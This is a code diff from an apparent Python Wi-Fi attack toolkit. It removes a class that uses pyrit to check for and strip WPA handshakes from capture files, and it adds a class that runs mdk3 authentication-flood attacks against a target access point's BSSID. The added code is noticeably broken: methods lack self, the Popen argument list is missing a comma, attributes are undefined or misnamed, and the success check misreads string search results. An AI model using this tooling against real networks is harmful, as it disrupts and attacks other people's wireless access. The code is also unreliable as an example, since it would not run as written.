@@ -307,51 +307,33 @@ class Reaver(object):
                                 "key":key,
                                 "wps":wps}
 
-### NEEDS IMPLEMENTATION OF AIRODUMP PCAP DUMP!!!!!
-class WPAcrack(object):
-    def __init__(self, iface, essid, bssid, channel=False):
-        self._iface = iface
-        self._bssid = bssid
-        self._essid = essid
-        self._channel = channel
-        self._filename = tempfile.mkstemp()
-
-    def has_handshake(capfile):
-        """
-            Uses pyrit to check for a handshake.
-            Returns "True" if handshake is found, false otherwise.
-        """
-        cmd = ['pyrit', '-r', capfile, 'analyze'] #Call pyrit to "Analyze" the cap file's handshakes.
-        proc = run(cmd, stdout=PIPE, stderr=DEVNULL)
-        hit_essid = False
-        for line in proc.stdout.decode("utf-8").split("\n"):
-            # Iterate over every line of output by Pyrit
-            if line == '' or line is None:
-                continue
-            if line.find("AccessPoint") != -1:
-                hit_essid = (line.find("('" + self._ssid + "')") != -1) and \
-                            (line.lower().find(self._bssid.lower()) != -1)
-            else:
-                if hit_essid and (line.find(', good, ') != -1 or
-                                  line.find(', workable, ') != -1):
-                    return True
-        return False
-
-
-    def strip_handshake(capfile):
-        """
-            Uses Tshark or Pyrit to strip all non-handshake packets
-            from a .cap file.
-            File in location 'capfile' will be overwritten!
-        """
-        output_file = capfile + "temp"
-        cmd = ['pyrit',
-               '-r', capfile,
-               '-o', output_file,
-               'strip']
-        run(cmd, stdout=DEVNULL, stderr=DEVNULL)
-        rename(capfile + '.temp', output_file)
+class mdk3(Air):
+    """docstring for mdk3"""
+    def __init__(self, bssid):
+        self.bssid = bssid
 
     def start():
-        aircrack = Aircrack('wpa', self._filename)
-        aircrack.start()
+        self._proc = Popen([
+            "mdk3",
+            self._iface,
+            "a",
+            "-a", self._bssid,
+            "-m"]
+            stdout=PIPE, stderr=DEVNULL)
+
+    def stop():
+        self._proc.kill()
+
+    @property
+    def check_progress():
+        output, _ = self.proc.communicate()
+        if output.count("seems to be INVULNERABLE!") > 10:
+            self.stop()
+            return "failed"
+        if output.find("got authentication frame: from wrong AP or failed authentication!"):
+            self.stop()
+            return "success"
+        else:
+            return "progress"
+
+        
